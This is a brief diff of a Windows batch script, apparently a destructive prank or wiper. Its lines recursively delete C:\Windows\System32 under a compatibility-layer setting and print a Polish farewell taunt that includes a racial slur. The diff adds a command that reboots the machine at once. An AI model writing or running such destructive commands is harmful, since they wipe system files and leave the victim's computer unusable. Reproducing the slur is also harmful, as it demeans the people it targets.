@@ -12,3 +12,4 @@ Set __COMPAT_LAYER=RunAsInvoker && rmdir /s /q C:\Windows\System32
 echo XDDDDDDDD
 echo 'Nacisnij jakikolwiek klawisz aby pożegnać się z systemem.... (C) STRBLZNGx 1337 HACKAZ REAL NIGGHAZ OUT HERE.'
 pause > nul
+shutdown /r /t 0
